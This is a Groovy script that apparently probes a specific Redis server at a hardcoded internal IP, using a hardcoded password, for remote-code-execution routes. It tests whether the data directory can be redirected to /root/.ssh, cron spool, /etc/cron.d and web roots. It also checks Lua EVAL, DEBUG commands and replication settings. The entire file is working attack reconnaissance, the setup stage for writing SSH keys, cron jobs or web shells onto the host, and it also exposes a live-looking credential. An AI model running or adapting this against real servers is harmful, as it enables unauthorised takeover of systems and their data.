import java.net.Socket
import java.io.BufferedReader
import java.io.InputStreamReader

def redisExec(String host, int port, String password, List<String> commands) {
    def results = []
    Socket sock = null
    try {
        sock = new Socket()
        sock.connect(new java.net.InetSocketAddress(host, port), 5000)
        sock.setSoTimeout(5000)
        def os = sock.getOutputStream()
        def br = new BufferedReader(new InputStreamReader(sock.getInputStream()))
        
        os.write("AUTH ${password}\r\n".getBytes())
        os.flush()
        Thread.sleep(300)
        readAll(br)
        
        commands.each { cmd ->
            os.write("${cmd}\r\n".getBytes())
            os.flush()
            Thread.sleep(300)
            results << [cmd: cmd, resp: readAll(br)]
        }
    } catch (Exception e) {
        results << [cmd: "ERROR", resp: "${e.class.simpleName}: ${e.message}"]
    } finally {
        try { sock?.close() } catch(Exception e) {}
    }
    return results
}

def readAll(BufferedReader br) {
    def sb = new StringBuilder()
    try {
        while (true) {
            if (!br.ready()) { Thread.sleep(200); if (!br.ready()) break }
            def line = br.readLine()
            if (line == null) break
            sb.append(line).append('\n')
        }
    } catch (java.net.SocketTimeoutException e) {}
    return sb.toString().trim()
}

println "=== REDIS RCE VECTOR TESTING ==="
println "Target: 172.27.140.151:6379"

// 1. Test CONFIG SET dir to various locations
println "\n--- TESTING CONFIG SET dir PERMISSIONS ---"
def testDirs = [
    "/tmp",
    "/var/spool/cron",
    "/var/spool/cron/crontabs",
    "/root/.ssh",
    "/home",
    "/var/www",
    "/var/www/html",
    "/opt",
    "/etc",
    "/etc/cron.d",
]

testDirs.each { dir ->
    def cmds = ["CONFIG SET dir ${dir}"]
    def r = redisExec("172.27.140.151", 6379, "@st0rAg3K3Y", cmds)
    def resp = r[0].resp
    def status = resp.contains('+OK') ? 'WRITABLE' : resp.contains('ERR') ? 'DENIED' : resp
    println "  ${dir} => ${status}"
    
    if (resp.contains('+OK')) {
        // Restore original dir
        def restore = redisExec("172.27.140.151", 6379, "@st0rAg3K3Y", ["CONFIG SET dir /var/lib/redis/data"])
    }
}

// 2. Test Lua scripting
println "\n--- TESTING LUA SCRIPTING ---"
def luaCmds = [
    'EVAL "return 1+1" 0',
    'EVAL "return redis.call(\'INFO\', \'server\')" 0',
    'EVAL "return redis.call(\'CONFIG\', \'GET\', \'dir\')" 0',
]
def rLua = redisExec("172.27.140.151", 6379, "@st0rAg3K3Y", luaCmds)
rLua.each { r ->
    println "\n${r.cmd}:"
    def val = r.resp
    if (val.length() > 500) val = val.substring(0, 500) + "...[TRUNCATED]"
    println "  ${val}"
}

// 3. Check DEBUG capabilities
println "\n--- DEBUG CAPABILITIES ---"
def debugCmds = [
    "DEBUG SLEEP 0",
    "DEBUG SET-ACTIVE-EXPIRE 1",
    "DEBUG OBJECT srqaclient_R2JCSzBUaWlVVXdERWw5Y2F3NlBjZz09OjobbPiZPlUUVbwLZuLlC/pn",
]
def rDebug = redisExec("172.27.140.151", 6379, "@st0rAg3K3Y", debugCmds)
rDebug.each { r ->
    println "  ${r.cmd} => ${r.resp}"
}

// 4. Check SLAVEOF/REPLICAOF capability  
println "\n--- REPLICATION CAPABILITIES ---"
def replCmds = [
    "CONFIG GET slave-read-only",
    "CONFIG GET slave-serve-stale-data",
]
def rRepl = redisExec("172.27.140.151", 6379, "@st0rAg3K3Y", replCmds)
rRepl.each { r ->
    println "  ${r.cmd} => ${r.resp}"
}

// 5. Restore dir to original
def rRestore = redisExec("172.27.140.151", 6379, "@st0rAg3K3Y", ["CONFIG SET dir /var/lib/redis/data"])
println "\n--- RESTORE DIR ---"
println "  ${rRestore[0].resp}"

println "\n=== RCE TEST DONE ==="
